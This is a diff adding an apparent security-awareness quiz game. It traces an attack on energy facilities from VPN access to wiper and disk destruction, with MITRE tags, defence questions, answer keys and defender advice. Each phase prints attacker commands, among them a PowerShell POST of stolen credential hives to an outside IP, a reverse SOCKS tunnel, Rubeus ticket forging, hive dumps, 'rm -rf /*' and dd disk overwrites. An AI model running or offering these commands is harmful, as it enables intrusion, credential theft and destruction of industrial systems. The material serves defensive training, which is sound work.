+    narrative: `The threat actor's entry point was <strong>FortiGate VPN devices</strong> exposed directly to the Internet — present at every targeted facility. These devices had <strong>no multi-factor authentication</strong> on VPN accounts. <br><br>
+    Intelligence suggests the attacker may have exploited a <strong>previously known RCE vulnerability</strong> on FortiGate or reused credentials stolen from other compromised facilities — a common industry practice where the same username/password pair is deployed across all sites.<br><br>
+    At the CHP plant, VPN logins came from <strong>Tor exit nodes</strong> and compromised servers across multiple countries, making attribution difficult in real-time.`,
+    code: `# ATTACKER ACTIVITY — FortiGate SSL-VPN
+IP: 185.200.177[.]10  [TOR EXIT NODE]
+IP: 31.172.71[.]5     [COMPROMISED VPS]
+ACTION: SSL-VPN portal authentication
+ACCOUNTS: Statically defined, NO MFA
+RESULT: ✓ ACCESS GRANTED`,
+    mitre: ["T1133 External Remote Services", "T1078.003 Valid Local Accounts"],
+    question: "Your FortiGate VPN is exposed to the internet with username/password only. The attacker attempts authentication from multiple IP addresses over several days. Which control would have MOST effectively prevented this initial access?",
+    choices: [
+      { text: "Deploy an intrusion detection system (IDS) to alert on failed logins", correct: false },
+      { text: "Enable multi-factor authentication (MFA) on all VPN accounts", correct: true },
+      { text: "Increase password complexity requirements", correct: false },
+      { text: "Block logins from known Tor exit nodes", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. Incident analysis explicitly noted that all VPN accounts lacked MFA — this was the primary enabler. MFA would have stopped the attack even with valid credentials. Password complexity and IP blocking can be bypassed; an IDS only alerts after the fact.",
+      incorrect: "✗ INCORRECT. While these controls have value, MFA was the critical missing control. All VPN accounts allowed authentication with just a username and password — MFA would have stopped this initial access even if credentials were stolen."
+    },
+    defender: "Enforce MFA on ALL external-facing VPN and remote access portals. Implement certificate-based authentication where possible. Regularly audit VPN accounts — remove unused ones and enforce least-privilege access. Log and alert on off-hours authentication patterns.",
+    maturity: { patch: 5, cred: 20, mfa: 35 }
+  },
+  {
+    id: 1,
+    name: "Persistence via FortiGate",
+    tactic: "T1053 — Scheduled Tasks on Firewall",
+    icon: "⚙️",
+    badge: "badge-red",
+    badgeText: "FORTINET ABUSE",
+    narrative: `At the manufacturing company, the attacker didn't stop at initial access. They <strong>weaponized the FortiGate device itself</strong> for persistence. Using FortiGate's built-in scripting engine, the attacker created <strong>three scheduled scripts</strong> that ran weekly:<br><br>
+    1. A credential-harvesting script that extracted admin passwords<br>
+    2. A security settings modification script<br>
+    3. An <strong>exfiltration script</strong> that sent results to an attacker-controlled <strong>Slack channel</strong> using FortiGate's native notification feature<br><br>
+    This is exceptionally stealthy — the scripts appeared as <em>legitimate scheduled tasks</em> in the FortiGate admin panel under "Scheduled Tasks."`,
+    code: `# FORTIOS CREDENTIAL EXFIL SCRIPT (simplified)
+config system automation-action
+  edit "REDACTED"
+    set action-type send-slack
+    set destination https://hooks.slack.com/T0[REDACTED]
+    set message '$(execute REDACTED)'  # extracts credentials
+  next
+end
+
+# RUNS WEEKLY — appears as normal admin task
+# Exfiltrates to attacker-controlled Slack workspace`,
+    mitre: ["T1053 Scheduled Task/Job", "T1567.004 Exfiltration via Webhook", "T1562.013 Modify Network Device Firewall"],
+    question: "An attacker creates automated scripts on your FortiGate firewall that appear as legitimate scheduled tasks. These run weekly and send config data to an external Slack webhook. What detection method would BEST catch this?",
+    choices: [
+      { text: "Monitor outbound traffic for connections to Slack domains (allowed by default)", correct: false },
+      { text: "Regular integrity checks of firewall configuration + alerting on new scheduled tasks", correct: true },
+      { text: "Deploy a firewall in front of your firewall", correct: false },
+      { text: "Disable the Slack integration feature on FortiGate", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. Configuration integrity monitoring is the key control here. FortiGate provides event logs for configuration changes — alerting on new scheduled tasks or config modifications would catch this. SIEM rules for FortiGate config-change events are highly recommended.",
+      incorrect: "✗ INCORRECT. Blocking Slack traffic might help but is operationally impractical in many environments, and attackers can use other channels. The root detection is monitoring for unauthorized configuration changes to network devices."
+    },
+    defender: "Implement configuration management for all network devices — baseline configs and alert on any deviations. Enable FortiGate's event logging for config changes and forward to a SIEM. Restrict who can create scheduled tasks on perimeter devices. Review FortiGate automation actions regularly.",
+    maturity: { net: 25, ir: 20 }
+  },
+  {
+    id: 2,
+    name: "Reconnaissance",
+    tactic: "T1016/T1046/T1087 — Discovery Techniques",
+    icon: "🔍",
+    badge: "badge-orange",
+    badgeText: "DISCOVERY PHASE",
+    narrative: `With access established, the attacker conducted <strong>months of methodical reconnaissance</strong> — largely during standard business hours to blend in with normal activity.<br><br>
+    Tools used: <strong>Advanced Port Scanner, Advanced IP Scanner</strong> (downloaded directly from vendor site via Edge --inprivate), standard Windows utilities (ping, nslookup, netstat), and <strong>Impacket</strong> for remote command execution via SMB.<br><br>
+    The attacker used <strong>nircmd.exe</strong> via PsExec to silently <strong>screenshot every machine</strong> — capturing HMI interfaces, SCADA dashboards, and OT network diagrams. Files named <em>outlog.txt</em> collected processes, connections, routing tables, and user directories from dozens of machines. Notably, <strong>most accessed systems had "scada" in their hostnames</strong>.`,
+    code: `# PSEXEC — REMOTE RECON ON EVERY MACHINE
+nircmd.exe "savescreenshot C:\\Windows\\Temp\\imagetmp.png"
+
+cmd.exe /c "tasklist > C:\\Windows\\TEMP\\outlog.txt 
+  && netstat -nao >> C:\\Windows\\TEMP\\outlog.txt 
+  && netstat -r >> C:\\Windows\\TEMP\\outlog.txt 
+  && arp -a >> C:\\Windows\\TEMP\\outlog.txt 
+  && dir /s /b C:\\Users >> C:\\Windows\\TEMP\\outlog.txt"
+
+# Target systems: *SCADA*, *HMI*, domain controller
+# Activity: weekdays, business hours, blending in`,
+    mitre: ["T1046 Network Service Discovery", "T1087 Account Discovery", "T0846 Remote System Discovery", "T0852 Screen Capture"],
+    question: "During business hours over several months, an internal host runs nircmd.exe, Advanced Port Scanner, and generates outlog.txt files across dozens of systems. Your SIEM has standard Windows event logs. Which alert logic would BEST detect this activity?",
+    choices: [
+      { text: "Alert on any use of PsExec or remote command execution across multiple hosts in a 24h window", correct: true },
+      { text: "Block the download of Advanced Port Scanner from vendor websites", correct: false },
+      { text: "Alert on any screenshot software running during business hours", correct: false },
+      { text: "Enable verbose logging on all SCADA systems", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. Lateral movement via PsExec/Impacket touching multiple systems is highly anomalous. Behavioral detection rules looking for remote execution patterns (Event ID 4688, Sysmon Process Create with network parentage) across multiple hosts are the right approach. Living-off-the-land (LoTL) detection requires behavioral baselines.",
+      incorrect: "✗ INCORRECT. Individual controls help but don't address the core pattern. The key is detecting the behavior of remote tool execution spreading across multiple hosts — this is a classic precursor to a major incident."
+    },
+    defender: "Deploy Sysmon with comprehensive process logging. Build SIEM rules for PsExec/PSTools lateral movement patterns. Baseline normal admin behavior and alert on deviations. Segregate SCADA hostnames from domain-discoverable naming schemes. Implement deception technology (honeypots) with SCADA-like names.",
+    maturity: { edr: 25, net: 15, ir: 15 }
+  },
+  {
+    id: 3,
+    name: "Privilege Escalation",
+    tactic: "T1003/T1558 — Credential Theft & Kerberos",
+    icon: "👑",
+    badge: "badge-red",
+    badgeText: "DOMAIN TAKEOVER",
+    narrative: `The attackers escalated to <strong>full domain control</strong> using a well-documented chain:<br><br>
+    1. <strong>LSASS memory dump</strong> — extracted from a domain controller using a tool dropped via Base64+certutil, harvesting plaintext passwords and NTLM hashes<br>
+    2. <strong>Rubeus</strong> — used to create a <em>Diamond Ticket</em> (a stealthy Kerberos golden/silver ticket variant that's harder to detect)<br>
+    3. <strong>ntds.dit extraction</strong> — the entire Active Directory database dumped using vssadmin shadow copies<br>
+    4. <strong>SAM/SYSTEM registry hives</strong> — extracted using reg.exe for offline password cracking<br><br>
+    At this point, <strong>every account in the organization was compromised</strong>. The attacker could authenticate as any user — silently.`,
+    code: `# STAGE 1: LSASS DUMP (via certutil base64 decode)
+certutil -decode b64payload.txt tool.exe
+# triggers LSASS credential dump
+
+# STAGE 2: DIAMOND TICKET (Rubeus)
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /[...]
+
+# STAGE 3: NTDS.DIT EXTRACTION 
+vssadmin create shadow /for=C:
+reg save HKLM\\SAM C:\\Windows\\Temp\\SAM
+reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM
+
+# STAGE 4: EXFILTRATION
+Invoke-RestMethod -Uri http://31.172.71[.]5:50443 -Method Post -InFile .\\kkk.zip`,
+    mitre: ["T1003 OS Credential Dumping", "T1558 Steal/Forge Kerberos Tickets", "T1003.003 NTDS"],
+    question: "An attacker on a domain controller runs vssadmin to create shadow copies and reg to export SAM/SYSTEM hives. They then use PowerShell's Invoke-RestMethod to POST a ZIP file to an external IP. Your EDR triggers a medium alert. What is the CORRECT response priority?",
+    choices: [
+      { text: "Investigate the alert during the next business day — medium alerts are common", correct: false },
+      { text: "Block the destination IP at the perimeter firewall", correct: false },
+      { text: "Immediately escalate: isolate the DC, revoke all Kerberos tickets (krbtgt reset x2), assume full domain compromise", correct: true },
+      { text: "Reset the passwords of the three user accounts found in the dump", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. ntds.dit + SAM/SYSTEM exfiltration = full domain compromise. The only correct response is immediate escalation: isolate affected DCs, perform double krbtgt password reset (invalidates all Kerberos tickets including golden/diamond tickets), assume ALL accounts are compromised, and notify leadership immediately. Partial remediation is useless after ntds.dit theft.",
+      incorrect: "✗ INCORRECT. These are dangerously insufficient responses. ntds.dit theft means every credential is compromised. Blocking one IP or resetting a few passwords won't help — the attacker already has everything offline and can resume with new infrastructure or cracked credentials."
+    },
+    defender: "Enable Windows Credential Guard to protect LSASS. Monitor for vssadmin/ntdsutil usage on DCs (rare in legitimate operations). Alert on LSASS memory access by non-system processes. Implement tiered administration (PAWs). Test your krbtgt reset procedure BEFORE you need it.",
+    maturity: { cred: 30, edr: 20, ir: 25 }
+  },
+  {
+    id: 4,
+    name: "OT Device Attacks",
+    tactic: "T0857 — System Firmware Manipulation",
+    icon: "⚡",
+    badge: "badge-red",
+    badgeText: "ICS/OT ATTACK",
+    narrative: `The attacks on renewable energy farms directly targeted <strong>industrial control system (ICS) hardware</strong> — an extremely rare event in public reporting:<br><br>
+    <strong>Hitachi RTU560 controllers</strong>: The attacker logged in using the <em>"Default"</em> account (factory default credentials never changed) and uploaded <strong>corrupted firmware</strong>. The malicious firmware had 240 bytes of 0xFF inserted at the entry point, causing an <em>invalid instruction fault → reboot loop</em>. Secure firmware update existed from v13.2.1 but was disabled on all devices. Even with it enabled, CVE-2024-2617 allowed bypass.<br><br>
+    <strong>Mikronika RTUs</strong>: Default SSH root credentials used. A destructive delete-all command executed. 30+ farms surveilled on 25 December.<br><br>
+    <strong>Hitachi Relion IEDs</strong>: Default FTP account used to delete critical system files → devices shut down permanently.<br><br>
+    <strong>Moxa NPort serial servers</strong>: Factory-reset, password changed, IP set to 127.0.0.1 to deny restoration.`,
+    code: `# HITACHI RTU560 — FIRMWARE CORRUPTION
+Login: "Default" / [default_password]  # Never changed
+Upload: firmware_13.5.3.0_CORRUPTED.elf
+# 240 bytes of 0xFF inserted at program entry point
+# Result: Invalid opcode → fault → reboot loop
+
+# MIKRONIKA RTU — SSH ROOT DELETION  
+ssh root@[RTU_IP]  # default credentials
+rm -rf /*          # delete all system files
+
+# MOXA NPORT — LOCKOUT
+# Factory reset → change password → set IP to 127.0.0.1
+# Result: device unreachable, recovery delayed by days`,
+    mitre: ["T0857 System Firmware", "T0809 Data Destruction", "T0812 Default Credentials", "T0816 Device Restart/Shutdown"],
+    question: "Your OT security audit reveals Hitachi RTU560 controllers in 30 substations all using the 'Default' account with default credentials and firmware v12.6.6.0 (current: v13.7.7). Remediation budget is limited. What's your HIGHEST PRIORITY action?",
+    choices: [
+      { text: "Deploy network monitoring on the OT segment to detect anomalous traffic", correct: false },
+      { text: "Change all default credentials immediately AND enable the secure firmware update feature", correct: true },
+      { text: "Upgrade firmware on all 30 devices to v13.7.7 (requires maintenance windows)", correct: false },
+      { text: "Add network-level authentication in front of RTU web interfaces", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. While firmware upgrades are ultimately necessary, the IMMEDIATE action is changing default credentials (5-minute fix per device) AND enabling secure firmware update signing (blocks corrupted firmware attacks). These quick wins dramatically raise the bar. Schedule firmware upgrades during next maintenance windows.",
+      incorrect: "✗ INCORRECT. Monitoring doesn't prevent the attack, and full firmware upgrades (while correct) require maintenance windows that could be weeks away. The fastest risk reduction comes from eliminating the 'Default' account and enabling firmware signing — achievable in hours, not weeks."
+    },
+    defender: "Maintain an OT asset inventory including firmware versions and default credential status. Establish an OT patching schedule aligned with maintenance windows. Segment OT networks — RTUs should NOT be reachable from corporate IT without explicit firewall rules. Enable firmware signing on all ICS devices that support it.",
+    maturity: { patch: 30, net: 20, cred: 25 }
+  },
+  {
+    id: 5,
+    name: "Lateral Movement",
+    tactic: "T1021 — RDP & Impacket Traversal",
+    icon: "↔️",
+    badge: "badge-orange",
+    badgeText: "LATERAL MOVEMENT",
+    narrative: `The attacker moved through the CHP plant network using <strong>exclusively legitimate tools</strong> — making detection extraordinarily difficult:<br><br>
+    • <strong>RDP (Remote Desktop)</strong> — used to hop between jump hosts and target systems, identical to authorized admin activity<br>
+    • <strong>FortiGate bookmarks</strong> with <em>statically embedded credentials</em> — the attacker didn't even need to know passwords; they were hardcoded in the VPN config<br>
+    • <strong>Impacket suite</strong> — enabled SMB-based remote execution, identified by the deployed EDR<br>
+    • <strong>rsocx (Reverse SOCKS Proxy)</strong> — deployed as r.exe/rsocx.exe to tunnel additional attack traffic through a compromised internal workstation back to <em>31.172.71[.]5:8008</em><br><br>
+    Microsoft Edge --inprivate was used to download tools from Dropbox and interact with Pastebin — both common legitimate services.`,
+    code: `# REVERSE SOCKS PROXY TUNNEL
+r.exe -r 31.172.71[.]5:8008
+# Tunnels attacker traffic through internal workstation
+# Allows remote access to ALL internal systems
+# External server at 31.172.71.5 acts as proxy
+
+# IMPACKET SMB EXECUTION (detected by EDR)
+# impacket-psexec / wmiexec.py style remote execution
+
+# FORTIOS HARDCODED CREDENTIALS (extracted from config)
+config vpn ssl web bookmark
+  edit "JUMP-HOST-1"
+    set type rdp
+    set host [JUMP_HOST_IP]
+    set sso-credential-sent true
+    set sso-username "REDACTED"  # static, in plaintext
+    set sso-password "REDACTED"`,
+    mitre: ["T1021 Remote Services", "T1090 Proxy — SOCKS", "T1105 Ingress Tool Transfer"],
+    question: "The attacker uses only RDP and legitimate Windows tools to move laterally — indistinguishable from normal admin traffic. Your network logs show normal-looking RDP sessions. Which approach provides the BEST detection capability?",
+    choices: [
+      { text: "Block all inbound RDP to internal systems from external networks", correct: false },
+      { text: "Implement User and Entity Behavior Analytics (UEBA) to detect anomalous RDP patterns (time, source, destination, volume)", correct: true },
+      { text: "Require all admins to use a dedicated jump server and log all sessions", correct: false },
+      { text: "Enable enhanced RDP logging in Windows Event Viewer", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. When the tools are legitimate, you need behavioral analysis. UEBA detects: admin accounts accessing systems they never accessed before, RDP sessions at unusual hours, unusually high volume of lateral connections, first-time access to SCADA/OT hostnames, and access originating from VPN → jump host → sensitive systems in rapid succession.",
+      incorrect: "✗ INCORRECT. These are good controls but insufficient alone. Jump server logging helps but doesn't detect abuse of legitimate sessions. Enhanced logs are useful but require analysis logic on top. UEBA/behavioral baselines are necessary to detect living-off-the-land attacks."
+    },
+    defender: "Never store credentials in VPN configuration files — use centralized authentication (LDAP/RADIUS). Implement privileged access workstations (PAWs) for OT access. Enable RDP session recording on jump hosts. Build UEBA baselines for all admin accounts. Separate OT jump hosts from IT jump hosts.",
+    maturity: { net: 20, edr: 20, ir: 15 }
+  },
+  {
+    id: 6,
+    name: "Exfiltration",
+    tactic: "T1567 — Data Theft (NTDS, Configs, M365)",
+    icon: "📤",
+    badge: "badge-orange",
+    badgeText: "DATA THEFT",
+    narrative: `Before launching destructive operations, the attacker stole <strong>sensitive intelligence</strong> for future operations:<br><br>
+    • <strong>Active Directory database (ntds.dit)</strong> — all domain credentials, extractable offline<br>
+    • <strong>SAM/SYSTEM registry hives</strong> — local account hashes from every machine<br>
+    • <strong>FortiGate configuration files</strong> — revealing network topology, VPN accounts, firewall rules, and embedded credentials covering multiple facilities<br>
+    • <strong>M365 data</strong> (Exchange, Teams, SharePoint) — the attacker used stolen on-premises credentials that had corresponding cloud accounts to access and download data. Target: files related to <em>OT modernisation, SCADA systems, and technical work orders</em><br><br>
+    Exfiltration used HTTP POST to <em>31.172.71[.]5:50443</em> — a non-standard port on a compromised server.`,
+    code: `# EXFIL VIA POWERSHELL HTTP POST
+Invoke-RestMethod -Uri http://31.172.71[.]5:50443 \\
+  -Method Post -InFile .\\kkk.zip
+# kkk.zip = ntds.dit + SAM + SYSTEM + FortiGate configs
+
+# M365 ACCESS — stolen on-prem credentials used against cloud accounts
+# Downloaded: Exchange mailboxes, Teams chats, SharePoint docs
+# Focus: OT documentation, SCADA modernisation plans, maintenance schedules
+
+# FORTIOS CONFIG THEFT
+# Config files downloaded via Edge --inprivate from domain controller
+# Contains: ALL VPN accounts, firewall rules, bookmarks with embedded creds`,
+    mitre: ["T1567 Exfiltration Over Web Service", "T1602.002 Network Device Config Dump", "T1530 Data from Cloud Storage"],
+    question: "The attacker used stolen on-premises AD credentials to authenticate to M365 and download OT-related documents from Exchange, Teams, and SharePoint. Which single control would have MOST directly blocked this cloud access?",
+    choices: [
+      { text: "Enforce MFA on M365 accounts independently of on-premises authentication", correct: true },
+      { text: "Block outbound HTTP on non-standard ports at the perimeter", correct: false },
+      { text: "Encrypt all SharePoint documents at rest", correct: false },
+      { text: "Rotate on-premises AD passwords after ntds.dit theft was detected", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. The attacker pivoted directly from stolen on-prem credentials into M365 cloud services. Requiring MFA specifically on cloud accounts — as a separate authentication step from on-premises login — would have blocked this access even with fully valid credentials. The attacker could not satisfy an MFA challenge without the enrolled device.",
+      incorrect: "✗ INCORRECT. Blocking non-standard ports helps with the data exfiltration channel but not the M365 authentication. Encrypting documents at rest is irrelevant when the attacker logs in legitimately. Rotating passwords after detection is too late — the cloud data was already downloaded."
+    },
+    defender: "Enforce MFA on all cloud service accounts — separately from on-premises authentication. Audit which AD accounts have cloud counterparts and treat those accounts with elevated scrutiny. Monitor for anomalous cloud logins: first-time access, new IP addresses, unusual hours, or bulk document downloads. Network device configurations should be access-controlled independently of domain credentials.",
+    maturity: { cred: 20, mfa: 30, ir: 10 }
+  },
+  {
+    id: 7,
+    name: "DynoWiper Deployment",
+    tactic: "T1485/T1484.001 — Data Destruction via GPO",
+    icon: "💀",
+    badge: "badge-red",
+    badgeText: "WIPER MALWARE",
+    narrative: `The climax: deployment of <strong>DynoWiper</strong> — a novel wiper malware not previously attributed to any known family, compiled on <em>26 December 2025</em>.<br><br>
+    Distribution mechanism: a <strong>PowerShell script modified the "Default Domain Policy" GPO</strong>, adding a Scheduled Task running as NT AUTHORITY\\SYSTEM that launched the wiper from a network share on every domain-joined machine.<br><br>
+    DynoWiper's operation: Uses <strong>Mersenne Twister random number generator</strong> to overwrite files at multiple offsets with pseudorandom 16-byte blocks, then deletes them. Skips Windows system directories to maintain bootability temporarily. Version A shuts down the system after wiping; Version B adds a 5-second sleep.<br><br>
+    <strong>The EDR saved the organization</strong>: canary files triggered when DynoWiper began overwriting data — execution was blocked on 100+ machines that had already launched the wiper.`,
+    code: `# GPO MODIFICATION SCRIPT (dynacon_update.ps1)
+# Creates backup of "Default Domain Policy"
+# Modifies GPO to add Scheduled Task:
+#   RunAs: NT AUTHORITY\\SYSTEM
+#   RunLevel: HighestAvailable
+#   Action: Execute wiper from \\\\SERVER\\share\\Source.exe
+#   Self-delete: schtasks.exe /delete /TN "Custom GPO Task" /F
+
+# DYNOWIPER BEHAVIOR (Source.exe / dynacom_update.exe)
+# PDB: C:\\Users\\vagrant\\Documents\\Visual Studio 2013\\...
+# 1. Mersenne Twister RNG init
+# 2. WipeCorruptData: overwrite files at random offsets (16B blocks)
+#    Skip: system32, windows, program files, temp, boot...
+# 3. WipeEraseFiles: DeleteFileW on all non-excluded files
+# 4. [Version A only] ExitWindowsEx() — system shutdown
+
+# DETECTION YARA RULE (HardHat Security):
+# strings: "$recycle.bin", "program files(x86)", "Error opening file: "`,
+    mitre: ["T1485 Data Destruction", "T1484.001 GPO Modification", "T1529 System Shutdown/Reboot", "T1222 File Permission Modification"],
+    question: "DynoWiper was distributed via GPO modification and ran as SYSTEM on 100+ machines before EDR blocked it. What security control DIRECTLY stopped the attack?",
+    choices: [
+      { text: "Antivirus signature detection of the wiper binary", correct: false },
+      { text: "EDR canary file mechanism — honeyfiles that trigger alerts when their contents are modified", correct: true },
+      { text: "GPO change monitoring alerting on Default Domain Policy modification", correct: false },
+      { text: "Network segmentation preventing the wiper from reaching domain machines", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. The EDR's canary mechanism saved the organization. The AV did NOT detect the binary (attacker compiled it fresh — no signature). Canary files (honeyfiles) placed in key directories trigger immediately when a wiper begins modifying them, providing seconds to block execution. This is a critical detection layer for novel malware.",
+      incorrect: "✗ INCORRECT. The AV did NOT detect DynoWiper. GPO monitoring would have been useful earlier but the wiper was already running. The canary/honeyfile mechanism in the EDR was specifically what blocked execution on 100+ machines in real-time."
+    },
+    defender: "Deploy EDR with canary/deception file capabilities. Restrict GPO modification rights to a dedicated, tightly controlled account — not general Domain Admin. Alert on any modification to Default Domain Policy. Monitor for Scheduled Task creation via GPO (Event ID 4702). Test your EDR's response to wiper-like behavior in a sandbox.",
+    maturity: { edr: 35, ir: 30, patch: 10 }
+  },
+  {
+    id: 8,
+    name: "Server Disk Destruction",
+    tactic: "T1561 — Disk Structure Wipe via KVM",
+    icon: "🔥",
+    badge: "badge-red",
+    badgeText: "PHYSICAL IMPACT",
+    narrative: `When the wiper was blocked on workstations, the attacker pivoted to <strong>directly destroying server disks</strong> — bypassing the OS entirely:<br><br>
+    1. Downloaded <strong>Tiny Core Linux</strong> ISO to a domain controller<br>
+    2. Booted a server via its <strong>KVM (Keyboard-Video-Mouse) over-IP interface</strong> using the Tiny Core image<br>
+    3. From the Linux environment, executed <code>dd</code> to <strong>overwrite disk partitions with random data</strong> — bypassing Windows, EDR, and AV entirely<br>
+    4. Attempted to destroy <strong>RAID array configurations</strong> using Intel Rapid Storage Technology (IRST) — even surviving a rebuild attempt<br><br>
+    This represents the highest tier of attack sophistication: when software-layer defenses blocked them, the attacker attacked the <strong>hardware layer</strong>. Recovery from disk-level destruction requires physical hardware access and days of work.`,
+    code: `# DOWNLOAD TINY CORE LINUX TO DOMAIN CONTROLLER
+# Via Edge --inprivate (evades proxy categorization slightly)
+
+# BOOT SERVER VIA KVM OVER-IP (IDRAC/iLO/IPMI interface)
+# Mount ISO as virtual media → boot to Tiny Core Linux
+# Bypasses Windows, EDR, AV — runs outside the OS
+
+# DISK DESTRUCTION
+dd if=/dev/urandom of=/dev/sda bs=4M count=500  # overwrites first 2GB
+dd if=/dev/urandom of=/dev/sdb bs=4M count=500
+
+# RAID DESTRUCTION ATTEMPT  
+# Modify IRST (Intel Rapid Storage Technology) RAID config
+# Reconfigure RAID-5 to RAID-0 or break array
+# Result: catastrophic data loss requiring hardware rebuild`,
+    mitre: ["T1561.002 Disk Structure Wipe", "T1490 Inhibit System Recovery"],
+    question: "An attacker with domain admin access reboots a critical server via its IPMI/KVM interface into a live Linux environment and runs 'dd' to destroy disks. Your EDR and AV are useless here. What defense-in-depth control would have BEST prevented or detected this?",
+    choices: [
+      { text: "Enable BitLocker on all server disks (encrypts data at rest)", correct: false },
+      { text: "Restrict IPMI/KVM/iDRAC access to a dedicated out-of-band management network, separate from the corporate domain and requiring separate credentials + MFA", correct: true },
+      { text: "Deploy a host-based firewall to block unauthorized processes", correct: false },
+      { text: "Enable RAID monitoring to detect array configuration changes", correct: false }
+    ],
+    feedback: {
+      correct: "✓ CORRECT. Out-of-band management (IPMI, iDRAC, iLO) is the critical attack surface here. These interfaces should NEVER be accessible from the corporate network — they operate below the OS level and can bypass all software security controls. A dedicated management VLAN with separate authentication (ideally not AD-integrated) and MFA would have blocked this attack vector entirely.",
+      incorrect: "✗ INCORRECT. BitLocker protects data confidentiality but doesn't prevent dd from overwriting data. Host-based firewalls and RAID monitoring don't help when the attacker operates outside the OS via IPMI/KVM. The attack surface is the out-of-band management interface, not the OS."
+    },
+    defender: "CRITICAL: Segment all IPMI/iDRAC/iLO/KVM-over-IP interfaces onto a dedicated, air-gapped management VLAN. Use separate credentials not synchronized with AD. Enable MFA on all BMC interfaces. Audit who has access to out-of-band management. Alert on any BMC logins — these should be rare and fully documented.",
+    maturity: { net: 30, edr: 10, ir: 20, patch: 15 }
+  }
+];
+
+// ═══════════════════════════════════════════════════════════════
+// GAME STATE
+// ═══════════════════════════════════════════════════════════════
+let state = {
+  score: 0,
+  currentPhase: 0,
+  answered: new Array(phases.length).fill(false),
+  correct: new Array(phases.length).fill(false),
+  maturity: { patch: 10, cred: 5, mfa: 0, net: 20, edr: 30, ir: 15 }
+};
+
+function startGame() {
+  document.getElementById('intro').classList.remove('active');
+  document.getElementById('game').classList.add('active');
+  buildChainNav();
+  renderPhase(0);
+}
+
+function buildChainNav() {
+  const nav = document.getElementById('chain-nav');
+  nav.innerHTML = '';
+  phases.forEach((p, i) => {
+    if (i > 0) {
+      const conn = document.createElement('div');
+      conn.className = 'chain-connector';
+      nav.appendChild(conn);
+    }
+    const el = document.createElement('div');
+    // Only phase 0 is unlocked at start
+    el.className = i === 0 ? 'chain-phase active' : 'chain-phase locked';
+    el.id = `chain-${i}`;
+    el.innerHTML = `
+      <div class="phase-num">PHASE ${String(i+1).padStart(2,'0')}</div>
+      <div class="phase-name">${p.name}</div>
+      <div class="phase-tactic">${p.tactic.split('—')[0].trim()}</div>
+      <div class="phase-icon">${p.icon}</div>`;
+    el.onclick = () => { if (!el.classList.contains('locked')) renderPhase(i); };
+    nav.appendChild(el);
+  });
+}
+
+function updateChainNav() {
+  phases.forEach((_, i) => {
+    const el = document.getElementById(`chain-${i}`);
+    el.className = 'chain-phase';
+    // Unlock all phases up to and including the one after the last answered
+    const lastAnswered = state.answered.lastIndexOf(true);
+    const unlockUpTo = Math.max(state.currentPhase, lastAnswered + 1);
+    if (i > unlockUpTo) el.classList.add('locked');
+    if (i === state.currentPhase) el.classList.add('active');
+    if (state.answered[i]) el.classList.add('completed');
+  });
+}
+
+function renderPhase(idx) {
+  state.currentPhase = idx;
+  const p = phases[idx];
+  
+  // Update header
+  document.getElementById('header-phase').textContent = `PHASE: ${p.name.toUpperCase()}`;
+  document.getElementById('current-phase-label').textContent = `PHASE ${idx+1}/${phases.length}`;
+  const pct = Math.round((idx / phases.length) * 100);
+  document.getElementById('progress-fill').style.width = pct + '%';
+  document.getElementById('progress-text').textContent = pct + '% COMPLETE';
+  
+  updateChainNav();
+
+  const content = document.getElementById('main-content');
+  const isAnswered = state.answered[idx];
+
+  content.innerHTML = `
+  <div class="phase-card">
+    <div class="phase-card-header">
+      <div class="phase-card-badge ${p.badge}">${p.badgeText}</div>
+      <div class="phase-card-title">${String(idx+1).padStart(2,'0')} — ${p.name}</div>
+    </div>
+    <div class="phase-card-body">
+      <div class="narrative">${p.narrative}</div>
+      
+      <div class="code-block">
+        <div class="code-label">ATTACKER COMMANDS</div>
+        ${highlightCode(p.code)}
+      </div>
+
+      <div class="mitre-tags">
+        ${p.mitre.map(t => `<div class="mitre-tag"><span class="tid">${t.split(' ')[0]}</span> ${t.split(' ').slice(1).join(' ')}</div>`).join('')}
+      </div>
+
+      <div class="challenge-box">
+        <div class="challenge-title">⚔ ADVERSARY EMULATION CHALLENGE — TEST YOUR DEFENSES</div>
+        <div class="challenge-q">${p.question}</div>
+        <div class="choice-grid" id="choices-${idx}">
+          ${p.choices.map((c, ci) => `
+            <button class="choice-btn ${isAnswered ? (c.correct ? 'correct' : 'incorrect') : ''} ${isAnswered ? 'answered' : ''}"
+              onclick="answer(${idx}, ${ci})" ${isAnswered ? 'disabled' : ''}>
+              <div class="choice-letter">${String.fromCharCode(65+ci)}</div>
+              <span>${c.text}</span>
+            </button>`).join('')}
+        </div>
+        <div class="feedback-box ${isAnswered ? 'show' : ''} ${isAnswered && !state.correct[idx] ? 'fail' : ''}" id="feedback-${idx}">
+          ${isAnswered ? (state.correct[idx] ? p.feedback.correct : p.feedback.incorrect) : ''}
+        </div>
+        ${isAnswered ? (idx < phases.length-1 ? 
+          `<button class="next-btn show" onclick="renderPhase(${idx+1})">NEXT: ${phases[idx+1].name} →</button>` :
+          `<div class="completion-modal" id="completion-modal">
+            <div class="completion-modal-inner">
+              <div class="completion-top">
+                <div class="completion-icon">🏁</div>
+                <div class="completion-headline">Simulation Complete</div>
+                <div class="completion-sub">You've completed all 9 phases of Operation Winter Storm.<br>Enter your name to generate your achievement badge.</div>
+              </div>
+              <div class="completion-score-row">
+                <div class="completion-score-item">
+                  <div class="completion-score-val" id="cm-score" style="color:var(--accent)">${state.score}</div>
+                  <div class="completion-score-lbl">POINTS</div>
+                </div>
+                <div class="completion-score-sep">/</div>
+                <div class="completion-score-item">
+                  <div class="completion-score-val" style="color:var(--dim)">${phases.length * 100}</div>
+                  <div class="completion-score-lbl">POSSIBLE</div>
+                </div>
+                <div class="completion-score-sep" style="margin:0 20px">·</div>
+                <div class="completion-score-item">
+                  <div class="completion-score-val" id="cm-pct" style="color:var(--accent2)">${Math.round((state.score / (phases.length * 100)) * 100)}%</div>
+                  <div class="completion-score-lbl">MATURITY</div>
+                </div>
+              </div>
+              <div class="completion-name-row">
